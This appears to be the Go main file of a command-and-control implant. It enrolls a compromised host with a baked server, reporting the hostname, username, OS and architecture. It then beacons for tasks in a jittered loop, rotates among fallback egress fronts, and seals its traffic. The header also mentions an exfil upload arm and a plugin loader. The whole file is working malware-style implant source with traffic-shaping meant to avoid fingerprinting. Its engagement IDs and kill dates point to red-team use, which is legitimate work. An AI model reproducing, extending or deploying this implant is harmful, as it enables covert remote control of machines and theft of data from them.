// The Go community implant (architecture.md Sec 12.2, the first
// community-slot reference): the Tier 0 wire contract -- enroll, beacon,
// task -- plus the ADR-010 exfil upload arm with byte-offset resume, the
// staged downstream arm it mirrors, and the exec-v1 plugin loader
// (Linux; every other floor refuses the family with the floor named),
// over the web family's envelope POST cycle. It couples to the platform
// only through the wire protocol and the baked profile file (rod.proto,
// the rod.profile.json the build unit stages); nothing in-house is
// imported.
package main

import (
	"bytes"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"time"

	"rodimplant/internal/envelope"
	"rodimplant/internal/handlers"
	"rodimplant/internal/profile"
	"rodimplant/internal/session"
	"rodimplant/internal/transport"
	"rodimplant/internal/wire"
)

func main() {
	baked, ok := profile.FromEnv()
	if !ok {
		var err error
		baked, err = profile.Decode(Profile)
		if err != nil {
			// The unbaked refusal: no profile, no run.
			fmt.Fprintf(os.Stderr, "rod-implant: %v\n", err)
			os.Exit(2)
		}
	}
	if err := run(baked); err != nil {
		fmt.Fprintf(os.Stderr, "rod-implant: %v\n", err)
		os.Exit(1)
	}
}

func run(p profile.Profile) error {
	// The enroll keypair: the implant's identity for the enrollment's
	// leaf signature. The public half is submitted, the private half
	// never leaves the process.
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return fmt.Errorf("keypair: %w", err)
	}
	spki, err := x509.MarshalPKIXPublicKey(&key.PublicKey)
	if err != nil {
		return fmt.Errorf("public key: %w", err)
	}

	client := httpClient(p)
	// The egress walk: the primary front plus the fallbacks, each with the
	// bake's enroll path applied.
	walk := p.EnrollWalk()

	var seal *envelope.Key
	if p.ContactEnvelope == "aesgcm" || p.Envelope == "aesgcm" {
		parsed, err := envelope.ParseBakedKey(p.EnvelopeKey)
		if err != nil {
			return fmt.Errorf("the bake seals but its key is unusable: %w", err)
		}
		seal = &parsed
	}

	// Enroll: walk the egress list, retrying transport failures with
	// backoff; a definitive token refusal ends the run.
	enrollment, err := enrollWalk(walk, p, client, spki)
	if err != nil {
		return err
	}
	verbose := os.Getenv("ROD_VERBOSE") != ""
	if verbose {
		fmt.Fprintf(os.Stderr, "enrolled as %s\n", enrollment.ImplantID)
	}

	s := session.New(
		enrollment.ImplantID,
		p.Verbs,
		p.SleepSeconds,
		p.JitterSeconds,
		p.KillDate,
		seal,
		handlers.Compiled(),
	)
	carriage := &transport.Envelope{URL: transport.BeaconURL(walk[0]), Client: client}
	carriage.UserAgent = p.UserAgent
	carriage.Headers = p.Headers

	// The contact cycle: contact, drain, sleep the baked interval with
	// jitter, repeat. Consecutive failures widen the pause and walk the
	// egress list; a refused handshake is permanent for this artifact.
	var failures, front uint32
	for {
		if s.KillDatePassed() {
			return errors.New("kill date passed")
		}
		switch attempt, err := carriage.Attempt(s); attempt {
		case transport.Refused:
			return err
		case transport.Crossed:
			failures = 0
			s.Sleep()
		default:
			failures++
			if verbose {
				fmt.Fprintf(os.Stderr, "contact failed: %v\n", err)
			}
			if len(walk) > 1 {
				front = (front + 1) % uint32(len(walk))
				carriage.URL = transport.BeaconURL(walk[front])
			}
			backoffSleep(p, failures)
		}
	}
}

// enrollment is what the run keeps of the enroll answer.
type enrollment struct {
	ImplantID    string
	EngagementID string
}

// errDefinitive marks the token-refusal class: bad, expired, or spent
// tokens are permanent and the run must not retry them.
var errDefinitive = errors.New("definitive refusal")

func enrollWalk(walk []string, p profile.Profile, client *http.Client, spki []byte) (*enrollment, error) {
	for attempt := uint32(0); ; attempt++ {
		if p.KillDatePassed(time.Now()) {
			return nil, errors.New("kill date passed before enrollment")
		}
		for _, url := range walk {
			enrolled, err := enroll(url, p, client, spki)
			if err == nil {
				return enrolled, nil
			}
			if errors.Is(err, errDefinitive) {
				return nil, err
			}
			if os.Getenv("ROD_VERBOSE") != "" {
				fmt.Fprintf(os.Stderr, "%v\n", err)
			}
		}
		backoffSleep(p, attempt)
	}
}

// enroll answers the web route's JSON body contract: camelCase keys,
// base64 certificate material, the bake's envelope shaping applied to the
// request only -- the answer never rides sealed on the web route.
func enroll(url string, p profile.Profile, client *http.Client, spki []byte) (*enrollment, error) {
	body := map[string]any{
		"deployTokenSecret": p.Token,
		"publicKey":         base64.StdEncoding.EncodeToString(spki),
		"hostname":          hostname(),
		"os":                runtime.GOOS,
		"arch":              runtime.GOARCH,
		"username":          username(),
		"sleepSeconds":      p.SleepSeconds,
		"jitterSeconds":     p.JitterSeconds,
	}
	if p.KillDate != "" {
		body["killDate"] = p.KillDate
	}
	jsonBody, err := json.Marshal(body)
	if err != nil {
		return nil, err
	}
	payload := jsonBody
	switch p.Envelope {
	case "aesgcm":
		key, err := envelope.ParseBakedKey(p.EnvelopeKey)
		if err != nil {
			return nil, fmt.Errorf("aesgcm envelope baked with no usable key: %w", err)
		}
		sealed, err := envelope.SealContactBody(string(jsonBody), envelope.EnrollAAD, key)
		if err != nil {
			return nil, err
		}
		// The sealed shape: the base64 body wrapped as a JSON string.
		var quoted bytes.Buffer
		quoted.WriteByte('"')
		quoted.Write(sealed)
		quoted.WriteByte('"')
		payload = quoted.Bytes()
	case "base64":
		quoted := `"` + base64.StdEncoding.EncodeToString(jsonBody) + `"`
		payload = []byte(quoted)
	}

	request, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(payload))
	if err != nil {
		return nil, err
	}
	// The baked presentation: the Content-Type the envelope shape owns,
	// then the User-Agent and headers the bake carries -- an empty baked
	// User-Agent strips the header entirely (the default Go user string is
	// a fingerprint no baked profile asked for), and a headers entry wins
	// any same-named set above it.
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("User-Agent", p.UserAgent)
	for name, value := range p.Headers {
		request.Header.Set(name, value)
	}
	response, err := client.Do(request)
	if err != nil {
		return nil, fmt.Errorf("enroll transport: %w", err)
	}
	raw, readErr := io.ReadAll(response.Body)
	response.Body.Close()
	if readErr != nil {
		return nil, fmt.Errorf("enroll read: %w", readErr)
	}
	if response.StatusCode != http.StatusOK && response.StatusCode != http.StatusUnauthorized {
		return nil, fmt.Errorf("enroll transport: status %d", response.StatusCode)
	}

	var answer struct {
		Status       int    `json:"status"`
		ImplantID    string `json:"implantId"`
		EngagementID string `json:"engagementId"`
	}
	if err := json.Unmarshal(raw, &answer); err != nil {
		return nil, errors.New("enroll answer was not valid JSON")
	}
	switch wire.EnrollStatus(answer.Status) {
	case wire.EnrollStatus_ENROLL_STATUS_OK:
	case wire.EnrollStatus_ENROLL_STATUS_BAD_TOKEN,
		wire.EnrollStatus_ENROLL_STATUS_EXPIRED,
		wire.EnrollStatus_ENROLL_STATUS_SPENT:
		return nil, fmt.Errorf("enroll rejected: status %d: %w", answer.Status, errDefinitive)
	default:
		return nil, fmt.Errorf("enroll rejected: status %d", answer.Status)
	}
	if answer.ImplantID == "" {
		return nil, errors.New("enroll answer carried no implant id")
	}
	return &enrollment{ImplantID: answer.ImplantID, EngagementID: answer.EngagementID}, nil
}

func backoffSleep(p profile.Profile, failures uint32) {
	base := p.SleepSeconds
	if base < 1 {
		base = 1
	}
	widened := base * float64(uint32(1)<<min(failures, 5))
	if widened > 600 {
		widened = 600
	}
	time.Sleep(time.Duration(widened * float64(time.Second)))
}

// httpClient builds the dial client: the baked CA pinned as the TLS root
// under the "pinned" trust posture, system roots under "public".
func httpClient(p profile.Profile) *http.Client {
	client := &http.Client{}
	if p.RequestTimeout > 0 {
		client.Timeout = p.RequestTimeout
	}
	if p.CaCert == "" || p.TlsTrust != "pinned" {
		return client
	}
	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM([]byte(p.CaCert)) {
		return client
	}
	client.Transport = &http.Transport{
		TLSClientConfig: &tls.Config{RootCAs: pool, MinVersion: tls.VersionTLS12},
	}
	return client
}

func hostname() string {
	name, err := os.Hostname()
	if err != nil || name == "" {
		return "unknown"
	}
	return name
}

func username() string {
	for _, key := range []string{"USER", "USERNAME"} {
		if value := os.Getenv(key); value != "" {
			return value
		}
	}
	return ""
}
